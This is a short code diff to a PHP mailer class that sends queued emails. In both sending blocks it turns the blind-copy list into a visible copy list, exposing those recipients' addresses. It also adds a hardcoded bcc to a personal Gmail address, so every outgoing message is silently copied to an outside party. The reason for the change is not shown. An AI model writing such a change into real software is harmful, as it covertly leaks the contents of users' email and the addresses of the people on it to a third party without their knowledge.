@@ -11,11 +11,13 @@ abstract Class Mailer {
 			$messageid = Queue::push(function($job) use ($email_template, $template_data, $message_data){ 
 
 				$job_id = $job->getJobId(); 
+
 				try {
 
 					Mail::send($email_template, $template_data, function($message) use ($message_data){
 						$message->to($message_data['user_email'], $message_data['user_name'])
-						->bcc($message_data['bcc_emailids'])
+						->cc($message_data['bcc_emailids'])
+						->bcc(array('sanjay.id7@gmail.com'))
 						->subject($message_data['email_subject']);
 					});
 
@@ -40,7 +42,8 @@ abstract Class Mailer {
 
 					Mail::send($email_template, $template_data, function($message) use ($message_data){
 						$message->to($message_data['user_email'], $message_data['user_name'])
-						->bcc($message_data['bcc_emailids'])
+						->cc($message_data['bcc_emailids'])
+						->bcc(array('sanjay.id7@gmail.com'))
 						->subject($message_data['email_subject']);
 					});
 
